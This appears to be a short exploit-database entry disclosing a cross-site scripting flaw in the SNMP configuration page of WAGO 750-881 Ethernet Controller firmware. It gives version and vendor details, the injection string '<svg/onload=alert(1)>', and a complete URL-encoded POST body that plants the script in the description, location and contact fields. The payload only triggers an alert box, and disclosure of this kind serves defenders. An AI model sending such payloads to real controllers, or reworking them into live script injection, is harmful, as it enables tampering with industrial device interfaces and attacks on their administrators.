# Exploit Title: WAGO 750-881 01.09.18 - Cross-Site Scripting
# Date: 2018-08-30
# Exploit Author: SecuNinja (@secuninja)
# Vendor Homepage: wago.com
# Version: 01.09.18(13) and earlier
# Affected Products: Ethernet Controller 750-881 - 01.09.18(13), 01.08.01 (10)
# CVE : N/A

# Description
# WAGO 750-881 Ethernet Controller devices, versions 01.09.18(13) and before, 
# have XSS in the SNMP configuration via the webserv/cplcfg/snmp.ssi
# SNMP_DESC or SNMP_LOC_SNMP_CONT field.

# PoC
# http://ip.address/webserv/cplcfg/snmp.ssi FORM fields SNMP_DESC, SNMP_LOC_SNMP_CONT
# Exploit String "<svg/onload=alert(1)>
# http-post-data:
SNMP_DESC=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E&SNMP_LOC%22%3E%3Csvg%2Fonload%3Dalert%282%29%3E&SNMP_CONT=%22%3E%3Csvg%2Fonload%3Dalert%283%29%3E&SNMP_V1V2_ENABLE=SNMP_V1V2_ENABLE&SNMP1_LCOM_NAME=public&SNMP_TR_V1V2_1_IP=0.0.0.0&SNMP1_COM_NAME=public&SNMP_V1V2_TR1_VERSION=SNMP_V1V2_TR1_VERSION1&SNMP_TR_V1V2_2_IP=0.0.0.0&SNMP2_COM_NAME=public&SNMP_V1V2_TR2_VERSION=SNMP_V1V2_TR2_VERSION1&SUBMIT=SUBMIT